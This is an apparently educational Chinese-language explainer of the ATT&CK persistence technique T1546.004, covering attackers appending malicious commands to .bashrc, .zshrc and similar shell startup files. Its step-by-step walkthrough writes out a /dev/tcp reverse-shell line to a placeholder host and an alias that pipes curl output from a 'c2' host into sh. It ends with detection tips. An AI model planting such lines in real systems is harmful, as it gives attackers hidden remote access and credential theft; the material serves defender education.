## 技术描述

**Unix Shell配置修改**（T1546.004）是 **事件触发执行**（T1546）的一个具体变体，属于 **持久化** 阶段的攻击技术。

> 🐚 **打个比方**：就像在Linux的.bashrc里加了一条"每次打开终端都执行"的命令——攻击者修改shell配置文件（.bashrc、.zshrc等），每次新终端启动时执行恶意代码。

### 具体怎么理解？

修改.bashrc等shell配置文件

攻击者使用这种技术时，通常是在持久化阶段，想要达到特定的攻击目标。与父技术 T1546 相比，T1546.004 有自己独特的特点和使用场景。

### 为什么有效？

这种技术之所以有效，是因为：
1. **隐蔽性**：利用了正常系统功能或常见协议，不容易被发现
2. **技术门槛适中**：不需要特别高深的技术知识就能实施

**过渡段：** 不要以为持久化就是'写个启动项'那么简单——攻击者有50种以上维持访问的方法。
3. **广泛适用**：可以在多种环境和系统中使用

## 攻击流程

```
获取Linux访问权限 → 定位Shell配置文件 → 追加恶意命令/别名覆盖 → 用户打开终端或SSH登录 → Shell加载配置自动执行
```

```mermaid
graph LR
    A["获取Linux访问权限"] --> B["定位.bashrc/.zshrc"]
    B --> C["追加恶意命令"]
    C --> D["用户SSH登录"]
    D --> E["Shell加载配置执行"]
```

**步骤详解：**

1. **获取Linux访问权限**
   - 通俗描述：攻击者获得目标Linux系统对应用户家目录的写权限
   - 技术细节：通过SSH爆破、Web漏洞或已有低权限账户；需对目标用户的 ~/.bashrc、~/.zshrc 等配置文件具备写权限；root 可修改 /etc/profile、/etc/bash.bashrc 影响全局
   - 常用工具：Hydra、CVE漏洞利用、Web Shell
2. **定位Shell配置文件**
   - 通俗描述：查找目标用户使用的Shell配置文件
   - 技术细节：bash 用 ~/.bashrc（交互式非登录）和 ~/.bash_profile（登录Shell）；zsh 用 ~/.zshrc；全局配置 /etc/profile、/etc/profile.d/*.sh；通过 echo $SHELL 确认目标Shell类型
   - 常用工具：cat、grep、ls -la ~
3. **追加恶意命令/别名覆盖**
   - 通俗描述：在配置文件末尾隐蔽地追加恶意代码
   - 技术细节：直接追加反向Shell命令（nohup bash -i >& /dev/tcp/x.x.x.x/4444 0>&1 &）；或别名覆盖 `alias ls='ls; curl http://c2/x|sh'`；可设置环境变量劫持 LD_PRELOAD；用空白行和注释伪装
   - 常用工具：echo >>、cat heredoc、curl/wget下载
4. **用户SSH登录或打开终端**
   - 通俗描述：等待目标用户启动新的Shell会话
   - 技术细节：SSH登录触发 ~/.bash_profile → ~/.bashrc；终端窗口打开触发 ~/.bashrc；cron任务执行 bash -c 不触发交互式配置；可通过修改 /etc/motd 强制提醒
   - 常用工具：SSH客户端、Terminal、tmux
5. **Shell加载配置自动执行**
   - 通俗描述：Shell启动时自动加载配置文件，恶意代码在用户上下文中执行
   - 技术细节：bash 启动顺序：/etc/profile → ~/.bash_profile → ~/.bashrc；恶意代码继承用户权限和环境变量；可窃取 SSH 密钥、token、AWS 凭据；后台建立持久C2连接
   - 常用工具：bash、zsh、反向Shell

### 应用层检测

**用人话说：** 就像在Linux的"自动运行脚本"里偷偷加了一行"给黑客开门"的命令——攻击者在用户的`~/.bashrc`、`~/.bash_profile`、`~/.zshrc`等shell配置文件中追加恶意命令，比如`echo "Hacked!" > /tmp/pwned`或者反弹Shell。每次用户登录终端时，Shell会自动source这些配置文件，执行恶意代码。因为是追加在文件末尾，看起来像是正常的配置条目。攻击者常用`echo "malicious_command" >> ~/.bashrc`一行命令就能完成植入。检查配置文件中是否有异常的curl、wget、nc等网络命令是发现此类攻击的关键。
